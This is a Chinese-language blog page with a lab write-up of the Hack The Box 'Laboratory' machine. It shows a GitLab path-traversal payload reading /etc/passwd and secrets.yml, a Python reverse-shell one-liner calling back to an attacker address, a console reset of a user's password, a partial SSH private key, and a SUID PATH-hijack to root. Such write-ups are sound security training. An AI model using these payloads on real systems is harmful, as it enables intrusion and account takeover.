@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="One way to choose one">
+    <meta name="author" content="Misaki">
+    <meta name="keywords" content="">
+    <title>Laboratory ~ Misaki&#39;s Blog</title>
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+    
+<link rel="stylesheet" href="/css/main.css">
+
+    
+        
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
+        
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class=" sidebar-collapse">
+<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
+    <div class="container">
+        <div class="navbar-translate">
+            <a class="navbar-brand" href="/">
+                Misaki&#39;s Blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ml-auto">
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/archives/">
+                                    archives
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about/">
+                                    about
+                                </a>
+                            </li>
+                        
+                    
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-twitch"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-envelope"></i>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+    </div>
+</nav>
+    
+  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
+    
+      <div class="container">
+        <h1 class="title text-center post_title">Laboratory</h1>
+        <p class="text-center"><b>Friday, April 2nd 2021, 5:30 pm</b></p>
+      </div>
+    
+  </div>
+
+  
+  
+  
+    <div class="row" style="margin: 0 0 0; z-index: 999;">
+  <div class="col-md-8 offset-md-1">
+    <div class="main main-raised">
+      <div class="container">
+        <div class="section">
+          <div class="post_content">
+              <p>国际惯例，先执行nmap扫描</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401124339754.png" alt="image-20210401124339754"></p>
+<p>看到跳转到laboratory.htb，配置host文件，指向10.10.10.216，访问查看是个啥。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401114204630.png" alt="image-20210401114204630"></p>
+<p>按照国际惯例第二步，查看目录。使用dirb来爆破目录，此处尝试了半天没有发现任何有用信息，只是发现可以目录浏览，<a target="_blank" rel="noopener" href="https://laboratory.htb/assets/">https://laboratory.htb/assets/</a>，当然下面也没有任何有用信息，都是一些css文件和图片。</p>
+<p>目前来看没有下一步的方法，肯定是有啥没被发现。再去扫一遍端口，想看看是不是遗漏了啥，但是发现结果仍然一样，不过注意到了其中的一个DNS名称：git.laboratory.htb。</p>
+<p>同样配置后访问发现是一个gitlab服务，需要注册一个账号。注册完成后登陆即可，然后发现一个公开的库，是刚才那个网站的前端代码，跟上面浏览的一致，也没啥</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401125022916.png" alt="image-20210401125022916"></p>
+<p>发现一个issus，提交是说服务有问题，那这个418是啥。状态代码418被定义为愚人节的笑话，并且“预计不会被实际的HTTP服务器实现”。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401125355719.png" alt="image-20210401125355719"></p>
+<p>这就是个愚人节玩笑，难道这个有用？查了一下发现触发类似某种特定情况下，比如未知的错误会被定向到418，但是这个系统好像没有这一说。</p>
+<p>搜一下gayhub，查到一个CVE-2020-10977，文件读取漏洞，尝试执行读取passwd查看。后续并没有找到可以帮助获取权限的敏感文件，返回基本都是400。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401140849690.png" alt="image-20210401140849690"></p>
+<p>正好根据这个靶场看一下这个漏洞怎么执行。需要先创建两个项目，如test1，test2。</p>
+<p>在一个项目下创建一个issus，写入如下内容</p>
+<pre class="line-numbers language-none"><code class="language-none">![a](&#x2F;uploads&#x2F;11111111111111111111111111111111&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402132824827-1617345369811.png" alt="image-20210402132824827"></p>
+<p>然后再移动这个issus到另一个项目下</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402133032215-1617345372559.png" alt="image-20210402133032215"></p>
+<p>然后在test2下就可以看到一个可以下载的passwd文件。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402133117660-1617345374422.png" alt="image-20210402133117660"></p>
+<p>后续的RCE就是读取了<code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>中的密钥</p>
+<p>获取其中的<code>secret_key_base</code>：</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402133905331-1617345376422.png" alt="image-20210402133905331"></p>
+<p>在gayhub上又找一个RCE可以使用，利用的也是上面的文件读取来获取key，然后在构造一个payload来执行rails控制台。需要先修改一些参数。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401143832510.png" alt="image-20210401143832510"></p>
+<p>需要监听端口，执行后监听端口反弹shell。不过这个shell及其不稳定，需要获取一个较为稳定的shell。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401143900205.png" alt="image-20210401143900205"></p>
+<p>新建一个文件写入python的反弹shell代码，如下</p>
+<pre class="line-numbers language-none"><code class="language-none">import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.0.0&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>开启一个http服务，然后运行下载此文件，系统上存在的python命令是python3。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401151620979.png" alt="image-20210401151620979"></p>
+<p>监听1234端口后，就能收到一个较为稳定的shell，在使用pty来升级一下。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401151716618.png" alt="image-20210401151716618"></p>
+<p>当前的git用户权限并不高，也没有sudo权限。上传linpeas.sh文件，来查看一下是否有能提权的方法。</p>
+<p>当前的可登陆用户就这几个，可能是直接获取root权限，不然就是获取别的用户权限再去获取root权限。查看一下其他用户是否能切换等。</p>
+<pre class="line-numbers language-none"><code class="language-none">git:x:998:998::&#x2F;var&#x2F;opt&#x2F;gitlab:&#x2F;bin&#x2F;sh
+gitlab-consul:x:991:991::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;consul:&#x2F;bin&#x2F;sh
+gitlab-prometheus:x:992:992::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;prometheus:&#x2F;bin&#x2F;sh
+gitlab-psql:x:996:996::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;postgresql:&#x2F;bin&#x2F;sh
+mattermost:x:994:994::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;mattermost:&#x2F;bin&#x2F;sh
+registry:x:993:993::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;registry:&#x2F;bin&#x2F;sh
+root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这几个用户并没有自己的用户目录，也不能进行查询切换等，基本是无用信息。内核为5.4版本，是多担心利用内核漏洞提权。尝试了一圈没发现能顺利提权的东西，那这个shell是给来做啥的。。。</p>
+<p>仔细看一下发现是个docker环境，可能是docker部署的gitlab，然后我们要拿到的应该是主机的权限。</p>
+<p>搜了一下有关的信息，看到一个rails命令，也跟shell的初始目录一致。这是一个命令行与GitLab实例进行交互的方法。Rails Runner还可以运行ruby代码。回头看一下漏洞执行代码，发现好像也是利用了这个性质来执行的ruby代码。还可以修改用户信息等，那么可以尝试一下是否能修改原来库的创建者的密码，也就是dexter 。执行的时候一直在报错，提示不正确。查一下错，发现是参数使用不正确。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401163139147.png" alt="image-20210401163139147"></p>
+<p>使用如下执行修改密码为test123456</p>
+<pre class="line-numbers language-none"><code class="language-none">git@git:~&#x2F;gitlab-rails&#x2F;working$ gitlab-rails console -e production
+gitlab-rails console -e production
+--------------------------------------------------------------------------------
+ GitLab:       12.8.1 (d18b43a5f5a) FOSS
+ GitLab Shell: 11.0.0
+ PostgreSQL:   10.12
+--------------------------------------------------------------------------------
+Loading production environment (Rails 6.0.2)
+irb(main):001:0&gt; user &#x3D; User.where(username:&quot;dexter&quot;).first
+user &#x3D; User.where(username:&quot;dexter&quot;).first
+user &#x3D; User.where(username:&quot;dexter&quot;).first
+&#x3D;&gt; #&lt;User id:1 @dexter&gt;
+irb(main):002:0&gt; user.password &#x3D; &quot;test123456&quot;
+user.password &#x3D; &quot;test123456&quot;
+user.password &#x3D; &quot;test123456&quot;
+&#x3D;&gt; &quot;test123456&quot;
+irb(main):003:0&gt; user.save!
+user.save!
+user.save!
+Enqueued ActionMailer::DeliveryJob (Job ID: 1c4bf31e-e3f6-4056-9685-45f6a4c7d2e2) to Sidekiq(mailers) with arguments: &quot;DeviseMailer&quot;, &quot;password_change&quot;, &quot;deliver_now&quot;, #&lt;GlobalID:0x00007ff5fd3ef940 @uri&#x3D;#&lt;URI::GID gid:&#x2F;&#x2F;gitlab&#x2F;User&#x2F;1&gt;&gt;
+&#x3D;&gt; true
+irb(main):004:0&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>登陆后发现还有一个SecureDocker库。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401163609462.png" alt="image-20210401163609462"></p>
+<p>在目录下找到一个dexter/.ssh目录，里面存在ssh的私钥信息。那就直接登陆查看。试了一圈发现不能登陆，一直提示格式不对，查了一圈发现这个id_rsa是新的openssh生成的新格式私钥。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402112405208.png" alt="image-20210402112405208"></p>
+<p>内容是<code>OPENSSH PRIVATE</code>开头的，服务器上需要的可能不是新格式，所以我们需要转换为<code>RSA PRIVATE</code>格式。</p>
+<pre class="line-numbers language-none"><code class="language-none">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAsZfDj3ASdb5YS3MwjsD8+5JvnelUs+yI27VuDD7P21odSfNUgCCt
+.......
+XCVyJn9QMEbE4fdpKGVF+MS&#x2F;CkfE+JaNH9KOLvMrlw0bx3At681vxUS&#x2F;VeISQyoQGLw&#x2F;fu
+uJvh4tAHnotmkAAAAPcm9vdEBsYWJvcmF0b3J5AQIDBA&#x3D;&#x3D;
+-----END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>下载<a target="_blank" rel="noopener" href="https://the.earth.li/~sgtatham/putty/latest/x86/puttygen.exe">https://the.earth.li/~sgtatham/putty/latest/x86/puttygen.exe</a>，然后打开File–&gt;load private key，加载后点击conversions–&gt;export openssh key第一项导出即可。格式如下。</p>
+<pre class="line-numbers language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----
+MIIG4wIBAAKCAYEAsZfDj3ASdb5YS3MwjsD8+5JvnelUs+yI27VuDD7P21odSfNU
+......
+5iqrf2njCLyuQRo1W4kpgWjwVMdZVwqzdn&#x2F;LQ1UaE95ppDDdwAeNS&#x2F;&#x2F;8rR24oD+b
++FbxNZUCzUgDmQ0PiwOs07JtFaE+HMuickqFx5W96gOye6dLD+8u
+-----END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用登陆查看，别忘记切换600的权限。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402112848551.png" alt="image-20210402112848551"></p>
+<p>获取第一个用户的flag</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402112936133.png" alt="image-20210402112936133"></p>
+<p>按照惯例，先查看SUID位，发现存在一个不和谐的文件<code>/usr/local/bin/docker-security</code>。是一个二进制文件，执行没有反应。利用ltrace来查看一个调用跟踪。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402114714292.png" alt="image-20210402114714292"></p>
+<p>大概就是一个限制docker权限的文件，先设置uid和gid位，后续执行chmod来调整权限。相当于用root的权限来限制。没有设置全路径，所以可以修改文件的执行目录，让先从我们设定的目录开始查找命令执行。利用环境变量来提权，参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2767">https://xz.aliyun.com/t/2767</a>。现在/tmp下新建一个反弹shell，名为chmod。赋予执行权限。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402124831047.png" alt="image-20210402124831047"></p>
+<p>监听端口后可以获取一个root的shell</p>
+
+          </div>
+          <br><br>
+              
+                <div class="license-wrapper">
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2021/04/Laboratory/">https://misakikata.github.io/2021/04/Laboratory/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2021/04/Laboratory/">April 2nd 2021, 5:30:53 pm</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2021/04/Laboratory/">April 2nd 2021, 5:30:53 pm</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                </div>
+              
+          <br><br>
+          <div>
+              <p>
+                       
+                      <span class="badge badge-default">#&nbsp;渗透测试</span>
+                      &nbsp;
+                       
+                      <span class="badge badge-default">#&nbsp;web安全</span>
+                      &nbsp;
+                      
+              </p>
+          </div>
+        </div>
+      </div>  
+    </div>
+  </div>
+  <!-- TOC -->
+  
+      <div class="">
+        <div id="toc">
+          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
+          <div id="tocbot"></div>
+        </div>
+      </div>
+  
+</div>
+
+
+<!-- Comments -->
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+    
+        
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = 'https://misakikata.github.io/2021/04/Laboratory/'; 
+            this.page.identifier = '/2021/04/Laboratory/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+        
+    
+    </div>
+</div>
+  
+
+<footer class="footer footer-default">
+        <div class="container">
+          <div class="float-left" style="padding: 15px 0;">
+              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
+          </div>
+          <div align="right" style="padding: 15px 0;">
+              <i class="iconfont icon-love" ></i>
+              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+          </div>
+        </div>
+</footer>
+      <!--   Core JS Files   -->
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
+        <script>
+            $(document).ready(function(){
+                $('pre').addClass('prettyprint linenums');
+                prettyPrint();
+            })
+        </script>
+      
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
